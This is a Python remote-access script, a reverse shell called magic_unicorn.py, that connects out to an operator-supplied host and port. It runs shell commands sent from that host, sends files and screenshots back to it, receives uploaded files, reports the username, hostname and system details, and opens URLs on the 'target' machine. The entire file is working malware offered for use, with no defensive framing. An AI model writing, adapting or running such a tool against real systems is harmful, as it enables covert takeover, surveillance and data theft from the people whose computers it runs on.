#!/usr/bin/env python3

# Most of code taken from stackoverflow because I am new at sockets

I = '\033[1;77m[i] \033[0m'
Q = '\033[1;77m[?] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'
G = '\033[1;34m[*] \033[0m'

import struct
import socket
import subprocess
import os
import sys
import platform
import platform
import getpass

from time import sleep
import webbrowser as browser

from PIL import ImageGrab

if len(sys.argv) != 3:
    print("Usage: magic_unicorn.py <remote_host> <remote_port>")
    sys.exit()

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])

def check_root():
    return os.getuid == 0

class handler:
    def __init__(self,sock):
        self.sock = sock
    def send(self, data):
        payloaded_packet = struct.pack('>I', len(data)) + data
        self.sock.sendall(payloaded_packet)
    def recv(self):
        payloaded_packet_length = self.recvall(4)
        if not payloaded_packet_length:
            return ""
        payloaded_packet_length = struct.unpack('>I', payloaded_packet_length)[0]
        return self.recvall(payloaded_packet_length)
    def recvall(self, n):
        payloaded_packet = "".encode("UTF-8")
        while len(payloaded_packet) < n:
            frame = self.sock.recv(n - len(payloaded_packet))
            if not frame:
                return None
            payloaded_packet += frame
        return payloaded_packet

def execute(command):
    command_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    return command_output.stdout.read() + command_output.stderr.read()

def upload(command):
    output_filename = "".join(command.split("download")).strip()
    if not output_filename.strip():
        unicorn.send("Usage: download <remote_file>".encode("UTF-8"))
    else:
        if not os.path.isfile(output_filename):
            unicorn.send((E+"Local file: {}: does not exist!".format(output_filename)).encode("UTF-8"))
        else:
            unicorn.send("true".encode("UTF-8"))
            with open(output_filename, "rb") as wf:
                for data in iter(lambda: wf.read(4100), "".encode("UTF-8")):
                    try:
                        unicorn.send(data)
                    except(KeyboardInterrupt,EOFError):
                        wf.close()
                        unicorn.send("fail".encode("UTF-8"))
                        return
            unicorn.send("success".encode("UTF-8"))

def download(command):
    output_filename = "".join(command.split("upload")).strip()
    if not output_filename.strip():
        unicorn.send("Usage: upload <local_file>".encode("UTF-8"))
    else:
        output_filename = output_filename.split("/")[-1] if "/" in output_filename else output_filename.split("\\")[-1] if "\\" in output_filename else output_filename
        wf = open(output_filename, "wb")
        while True:
            data = unicorn.recv()
            if data == b"success":
                break
            elif data == b"fail":
                wf.close()
                os.remove(output_filename)
                return
            wf.write(data)
        wf.close()
        unicorn.send(str(os.getcwd()+os.sep+output_filename).encode("UTF-8"))

def openurl(command):
    url = "".join(command.split("openurl")).strip()
    browser.open(url)

def screenshot():
    image = ImageGrab.grab()
    image.save("/tmp/.temp_screenshot.png", 'PNG')
    f = open("/tmp/.temp_screenshot.png", "rb").read()
    unicorn.send(f)
    os.remove("/tmp/.temp_screenshot.png")

def shell(handler=handler):
    global s, unicorn
    main_directory = os.getcwd()
    temp_directory = ""
    unicorn = handler(s)
    while True:
        command = unicorn.recv()
        if command.strip():
            command = command.decode("UTF-8", "ignore").strip()
            ui = command.split(" ")
            if ui[0] == "username":
                unicorn.send(getpass.getuser().encode("UTF-8"))
            elif ui[0] == "hostname":
                unicorn.send(platform.node().encode("UTF-8"))
            elif ui[0] == "download":
                upload(command)
            elif ui[0] == "upload":
                download(command)
            elif ui[0] == "screenshot":
                screenshot()
            elif ui[0] == "exit":
                s.shutdown(2)
                s.close()
                break
            elif ui[0] == "openurl":
                openurl(command)
            elif ui[0] == "rickroll":
                browser.open("https://www.youtube.com/watch?v=oHg5SJYRHA0")
                unicorn.send((S+"Target has been rickrolled!").encode("UTF-8"))
            elif ui[0] == "cd":
                directory = "".join(command.split("cd")).strip()
                if not directory.strip():
                    unicorn.send("{}".format(os.getcwd()).encode("UTF-8"))
                elif directory == "-":
                    if not temp_directory:
                        unicorn.send((E+"Failed to change directory").encode("UTF-8"))
                    else:
                        temp_directory_2 = os.getcwd()
                        os.chdir(temp_directory)
                        unicorn.send((I+"Changed to directory {}.".format(temp_directory)).encode("UTF-8"))
                        temp_directory = temp_directory_2
                elif directory =="--":
                    temp_directory = os.getcwd()
                    os.chdir(main_directory)
                    unicorn.send((I+"Changed to directory {}.".format(main_directory)).encode("UTF-8"))
                else:
                    if not os.path.isdir(directory):
                        unicorn.send((E+"Failed to change directory").encode("UTF-8"))
                    else:
                        temp_directory = os.getcwd()
                        os.chdir(directory)
                        unicorn.send((I+"Changed to directory {}.".format(directory)).encode("UTF-8"))
            elif ui[0] == "pwd":
                unicorn.send(str(os.getcwd()).encode("UTF-8"))
            elif ui[0] == "sysinfo":
                sysinfo = ""
                sysinfo += f"Operating System: {platform.system()}\n"
                sysinfo += f"Computer Name: {platform.node()}\n"
                sysinfo += f"Username: {getpass.getuser()}\n"
                sysinfo += f"Release Version: {platform.release()}\n"
                sysinfo += f"Processor Architecture: {platform.processor()}"
                unicorn.send(sysinfo.encode("UTF-8"))
            elif ui[0] == "shell":
                command = "".join(command.split("shell")).strip()
                if not command.strip():
                    unicorn.send("Usage: shell <command>".encode("UTF-8"))
                else:
                    command_output = execute(command)
                    unicorn.send(bytes(command_output.strip()))
            else:
                unicorn.send((E+"Unrecognized command!").encode())
    sys.exit()

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    shell()
except Exception:
    sys.exit()
